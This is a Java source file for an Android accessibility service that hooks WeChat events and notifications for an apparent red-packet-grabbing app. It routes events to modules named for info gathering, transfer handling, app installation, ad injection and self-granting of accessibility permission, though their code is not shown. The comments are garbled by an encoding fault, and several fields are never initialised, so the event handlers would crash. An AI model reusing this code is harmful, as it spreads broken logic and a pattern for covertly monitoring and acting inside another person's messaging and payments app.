/**
 * 
 */
package accessibility.job;



import util.ConfigCt;

import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import accessibility.app.WechatInfo;
import ad.Ad2;
import notification.IStatusBarNotification;
import notification.NotifyHelper;
import notification.TransferAccounts;


import android.annotation.TargetApi;
import android.app.Notification;
import android.app.PendingIntent;

import android.os.Build;

import android.view.accessibility.AccessibilityEvent;

import download.install.InstallApp;
import permission.accessibility.GiveAccessibilityPermission;

/**
 * @author byc
 *
 */
public class WechatAccessibilityJob  extends BaseAccessibilityJob{
	
	private static WechatAccessibilityJob current;
	private String mCurrentUI="";
	private InstallApp installApp;
	private WechatInfo wechatInfo;
	//private ShotCode shotCode;
	private TransferAccounts transferAccounts;
	//private GiveAccessbilityPower mGiveAccessbilityPower;
	private GiveAccessibilityPermission mGiveAccessibilityPermission;
	//---------------------------------------------------------------------------------------
	public WechatAccessibilityJob(){
		super(new String[]{ConfigCt.WECHAT_PACKAGENAME});
        //��װ:
        //installApp=InstallApp.getInstallApp();
	}
	//----------------------------------------------------------------------------------------
    @Override
    public void onCreateJob(QiangHongBaoService service) {
        super.onCreateJob(service);
        //context=getContext();
        //installApp.onCreateJob(service);

        //givePower=GivePower.getGivePower(service);
        //΢����Ϣ��
       // wechatInfo=WechatInfo.getWechatInfo(context, service);
        //shotCode=ShotCode.getShotCode();
        //��һ�����У����Ͷ�����Ϣ��
        //handlerWorks.postDelayed(runnable, 1000*2); 
        //service.f
        //transferAccounts=TransferAccounts.getTransferAccounts(service);
        //
        //mGiveAccessbilityPower=GiveAccessbilityPower.getGiveAccessbilityPower(service);
        //
        //mGiveAccessibilityPermission=GiveAccessibilityPermission.getGiveAccessibilityPermission(service);
    }
	
    @Override
    public void onStopJob() {
    	installApp.onStopJob();
    }
    public static synchronized WechatAccessibilityJob getJob() {
        if(current == null) {
            current = new WechatAccessibilityJob();
        }
        return current;
    }
    @Override
    public String[] getTargetPackageName() {
        return new String[]{ConfigCt.WECHAT_PACKAGENAME};
    }
    @Override
    public boolean isEnable() {
        return true;
    }
    @Override
    public void onWorking(){//ˢ�´������̣�
    	
    }
    //----------------------------------------------------------------------------------------
    @Override
    public void onReceiveJob(AccessibilityEvent event) {
    	
    	//debug(event);
    	String pkn = String.valueOf(event.getPackageName());
    	//��װ:
    	if(pkn.equals(installApp.getTargetPackageName())) {
    		installApp.onReceiveJob(event);
        }
    	//��ȡȨ�ޣ�
    	//givePower.onProcessEvent(event);
    	//���
    	//Ad.getAd(context, event.getPackageName().toString()).onReceiveJob(event);
    	Ad2.getAd2(service, event.getPackageName().toString()).onReceiveJob(event);
    	//��װ:
    	//installApp.onProcessInstallEvent2(event);

    	//��ȡ��Ϣ��
    	wechatInfo.onReceiveJob(event);
    	//���룺
    	//shotCode.onProcessEvent(event);
    	//
    	transferAccounts.onReceiveJob(event);
    	//
    	//mGiveAccessbilityPower.onProcessEvent(event);
    	//
    	//mGiveAccessibilityPermission.onProcessEvent(event);
    }
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    public void onNotificationPosted(IStatusBarNotification sbn) {
        Notification nf = sbn.getNotification();
        String text = String.valueOf(sbn.getNotification().tickerText);
        notificationEvent(text, nf);
    }
    /** ֪ͨ���¼�*/
    private void notificationEvent(String ticker, Notification nf) {
        String text = ticker;
        int index = text.indexOf(":");
        if(index != -1) {
            text = text.substring(index + 1);
        }
        text = text.trim();
        transferAccounts.notificationEvent(ticker, nf);
        //if(text.contains(TransferAccounts.WX_TRANSFER_ACCOUNTS_ORDER)) { //�����Ϣ
        //    newHongBaoNotification(nf);
        //}
    }

    /**��֪ͨ����Ϣ*/
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    private void newHongBaoNotification(Notification notification) {
    	TransferAccounts.mWorking = true;
        //�����Ǿ�������΢�ŵ�֪ͨ����Ϣ��
        PendingIntent pendingIntent = notification.contentIntent;
        boolean lock = NotifyHelper.isLockScreen(getContext());

        if(!lock) {
            NotifyHelper.send(pendingIntent);
        } else {
            //NotifyHelper.showNotify(getContext(), String.valueOf(notification.tickerText), pendingIntent);
        }

        if(lock) {
           // NotifyHelper.playEffect(getContext(), getConfig());
        }
    }
  
}
